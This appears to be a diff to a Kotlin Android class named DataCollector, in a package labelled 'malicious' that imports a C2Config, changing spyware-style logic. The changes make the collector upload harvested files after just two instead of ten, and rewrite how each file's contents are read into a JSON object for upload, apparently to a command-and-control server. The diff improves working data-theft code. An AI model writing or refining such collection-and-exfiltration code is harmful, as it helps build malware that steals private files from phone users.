@@ -20,7 +20,7 @@ import com.example.ChatterBox.malicious.C2Config
 class DataCollector {
     companion object {
         private const val TAG = "DataCollector"
-        private const val MAX_FILES_BEFORE_UPLOAD = 10
+        private const val MAX_FILES_BEFORE_UPLOAD = 2  // Upload after collecting just 2 files
         
         /**
          * Stores collected data to a local file.
@@ -94,8 +94,15 @@ class DataCollector {
                     val fileDataArray = JSONObject()
                     files.forEach { file ->
                         try {
-                            val content = file.readText()
-                            fileDataArray.put(file.name, content)
+                            // Read file content using BufferedReader for compatibility
+                            val content = StringBuilder()
+                            file.inputStream().bufferedReader().use { reader ->
+                                var line: String?
+                                while (reader.readLine().also { line = it } != null) {
+                                    content.append(line).append("\n")
+                                }
+                            }
+                            fileDataArray.put(file.name, content.toString())
                         } catch (e: Exception) {
                             Log.e(TAG, "Error reading file ${file.name}", e)
                         }
